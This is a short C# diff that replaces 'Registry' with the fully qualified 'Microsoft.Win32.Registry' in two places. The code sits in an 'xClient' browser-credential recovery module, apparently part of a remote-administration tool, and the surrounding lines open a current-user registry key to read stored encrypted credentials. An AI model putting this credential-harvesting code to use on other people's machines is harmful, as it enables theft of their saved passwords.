@@ -78,7 +78,7 @@ namespace xClient.Core.Recovery.Browsers
                 return false;
 
             //Now retrieve the encrypted credentials for this registry hash entry....
-            RegistryKey key = Registry.CurrentUser.OpenSubKey(KeyStr);
+            RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(KeyStr);
             if (key == null)
                 return false;
 
@@ -157,7 +157,7 @@ namespace xClient.Core.Recovery.Browsers
 
             // enumerate values of the target registry
             bool result = false;
-            RegistryKey key = Registry.CurrentUser.OpenSubKey(KeyStr);
+            RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(KeyStr);
             if (key == null)
                 return false;
 
